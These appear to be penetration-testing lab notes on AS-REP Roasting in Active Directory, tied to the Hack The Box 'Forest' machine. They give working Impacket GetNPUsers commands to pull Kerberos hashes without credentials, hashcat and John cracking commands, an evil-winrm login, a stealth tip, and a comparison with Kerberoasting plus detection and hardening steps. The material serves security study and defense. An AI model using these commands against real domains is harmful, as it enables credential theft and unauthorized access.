# AS-REP Roasting Attack

## Lab Details
- Lab: Forest (Hack The Box)
- Target Environment: Active Directory
- Objective: Extract TGTs from user accounts that do not require Kerberos pre-authentication and perform offline password cracking.

---

## Overview

AS-REP Roasting is a Kerberos-based attack targeting domain user accounts configured with:

> "Do not require Kerberos preauthentication"

In such cases:
- Attacker requests authentication data from KDC without credentials
- KDC responds with encrypted data
- Data can be cracked offline to recover password

---

## How It Works

### Normal Flow
- Pre-authentication ensures client proves knowledge of password

### If Pre-auth is Disabled

1. Attacker sends AS-REQ without credentials  
2. KDC responds with AS-REP  
3. Response contains encrypted data (user password hash)  
4. Attacker extracts hash → offline cracking  

---

## Lab Setup (Creating Vulnerable Account)

### Start PowerShell

    powershell.exe -nop -ep bypass

### Step 1: Define Password

    $PASSWORD = ConvertTo-SecureString -AsPlainText -Force -String "Password123"

### Step 2: Create User

    New-ADUser -Name "User-asrep-roast" `
    -SamAccountName "User-asrep-roast" `
    -AccountPassword $PASSWORD `
    -Enabled $true `
    -PasswordNeverExpires $true `
    -Description "AS-REP-Roast vulnerable account"

### Step 3: Disable Pre-authentication

    Set-ADAccountControl -Identity "User-asrep-roast" -DoesNotRequirePreAuth $true

### Step 4: Verify Vulnerable Users

    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

---

## Attack Execution

### Using Impacket (Linux)

    GetNPUsers.py -dc-ip <DC-IP> domain.local/ -usersfile users.txt -no-pass

### Example

    GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile usernames.txt -no-pass

### Parameters

- `<DC-IP>` → Domain Controller IP  
- `users.txt` → Username list  
- `-no-pass` → No authentication required  

---

## Hash Cracking

### Hashcat

    hashcat -m 18200 asrep_hash.txt /opt/rockyou.txt

### John the Ripper

    john --wordlist=/opt/rockyou.txt asrep_hash.txt

---

## Detection and Mitigation

### Preventive Measures

- Enable Kerberos pre-authentication for all users  
- Avoid "Do not require pre-authentication" setting  

### Monitoring

    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

- Monitor abnormal AS-REQ / AS-REP traffic  
- Enable Kerberos logging  

### Hardening

- Strong password policies  
- Enable MFA  
- Regular AD audits

# Impacket - GetNPUsers.py (AS-REP Roasting)

## Purpose

Retrieve AS-REP hashes for accounts with pre-auth disabled → offline cracking

---

## Overview

- Part of Impacket toolkit  
- Enumerates users and requests AS-REP responses  
- Works without credentials if pre-auth disabled  

---

## Basic Syntax

    GetNPUsers.py [domain]/[username[:password]] -dc-ip <domain_controller_ip> [options]

### Help

    impacket-GetNPUsers -h

---

## Common Usage

### Enumerate Users (No Auth)

    impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.50

### Request Hashes

    impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.50 -request

### Hashcat Format

    impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.50 -request -format hashcat

### Use Username List

    impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.50 -usersfile users.txt

### Anonymous Enumeration

    impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.50 -usersfile users.txt -no-pass

### Save Output

    impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -request -outputfile asrep-hashes.txt

---

## Crack AS-REP Hashes

### Identify Hashcat Mode

    hashcat -h | grep -i kerberos

Expected:

    18200 | Kerberos 5, etype 23, AS-REP

### Crack

    hashcat -a 0 -m 18200 asrep_hashes.txt /opt/rockyou.txt --show

---

## Post-Exploitation

    evil-winrm -i 192.168.2.100 -u username -p password

---

## Operational Notes

- Ensure proper username enumeration  
- Use `-no-pass` for stealth  
- Use `-format hashcat` for easier cracking  
- Clean up after testing

# Kerberoasting vs AS-REP Roasting

## Comparison Table

| Feature | AS-REP Roasting | Kerberoasting |
|--------|----------------|--------------|
| Requirement | Pre-auth disabled users | SPN accounts |
| Scope | Any misconfigured user | Service accounts |
| Auth Needed | No | Yes |
| Data | AS-REP | TGS |
| Encryption | User password hash | Service account hash |
| Tools | GetNPUsers, Rubeus | GetUserSPNs, Rubeus |
| Risk | Lower | Higher |
| Misconfig | Pre-auth disabled | Weak service passwords |

---

## Conceptual Difference

### AS-REP Roasting

- No authentication needed  
- Targets misconfigured users  
- Used in unauthenticated attacks  

### Kerberoasting

- Requires valid credentials  
- Targets service accounts  
- Used for lateral movement  

---

## Real-World Analogy

| Scenario | AS-REP | Kerberoasting |
|----------|--------|--------------|
| Access | No identity check | Requires login |
| Interaction | Request without auth | Authenticated request |
| Target | User password | Service password |

---

## When to Use

| Scenario | Technique |
|----------|----------|
| No credentials | AS-REP Roasting |
| Valid creds | Kerberoasting |
| Full enum | Both |

---

## Detection

### AS-REP Targets

    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

### Kerberoasting Targets

    Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName
